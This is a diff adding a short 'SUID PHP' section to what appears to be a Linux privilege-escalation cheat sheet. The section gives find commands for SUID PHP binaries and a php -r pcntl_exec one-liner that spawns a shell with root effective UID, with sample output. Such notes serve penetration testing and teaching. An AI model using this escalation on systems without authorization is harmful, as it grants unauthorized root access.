@@ -155,6 +155,19 @@ find / -group users -type f 2>/dev/null
 
 * In the above example users is the name of the group he is in.
 
+#### SUID PHP
+
+If PHP is SUID root, use `pcntl_exec` to preserve the elevated effective UID:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null | grep php
+# -rwsr-xr-x 1 root root 4786104 Feb 23  2023 /usr/bin/php7.4
+
+/usr/bin/php7.4 -r 'pcntl_exec("/bin/sh", ["-p"]);'
+id
+# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+```
+
 #### Sudo -l
 
 * If you have the password, on of the first checks should be
